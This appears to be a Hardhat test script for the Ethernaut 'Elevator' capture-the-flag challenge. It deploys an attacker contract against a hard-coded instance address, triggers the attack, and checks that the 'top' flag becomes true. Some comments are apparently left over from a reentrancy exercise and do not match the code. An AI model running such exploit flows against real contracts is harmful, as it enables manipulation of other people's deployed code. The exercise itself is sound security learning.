import { time, loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { anyValue } from "@nomicfoundation/hardhat-chai-matchers/withArgs";
import { expect } from "chai";
import { ethers } from "hardhat";
import { BigNumber, Contract } from "ethers";
import { Attack, Elevator } from "../typechain-types";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { getContractAddress } from "ethers/lib/utils";
import exp from "constants";
import { boolean } from "hardhat/internal/core/params/argumentTypes";

describe("Elevator Exploit using Contract ", function () {
  let attackerContract: Attack,
    elevatorContract: Elevator,
    attacker: SignerWithAddress,
    contractAddress: string,
    getTop: boolean;

  before("Setup for attack locally", async function () {
    [attacker] = await ethers.getSigners();
    //instance address of contract to attack
    contractAddress = "0x35677D19640bE9c35e0A8199EA5b38aDeE844476";
    // deploy reentrance contract
    elevatorContract = await ethers.getContractAt("Elevator", contractAddress);

    const attackContractFactory = await ethers.getContractFactory("Attack");

    attackerContract = await attackContractFactory.deploy(
      elevatorContract.address
    );

    await attackerContract.deployed();
  });

  it("perform exploit", async function () {
    // // Attack flow
    // 1 call attack contracts initiateAttack()

    let txAttack = await attackerContract.initiateAttack();

    let receiptAttack = await txAttack.wait();

    // view the state of top and verify that it's true

    getTop = await elevatorContract.top();

    console.log("The top has been set to :", getTop);
  });

  after("confirm exploit", async function () {
    // check that the reentrance contract == 0

    expect(getTop).to.be.eq(true);
  });
});
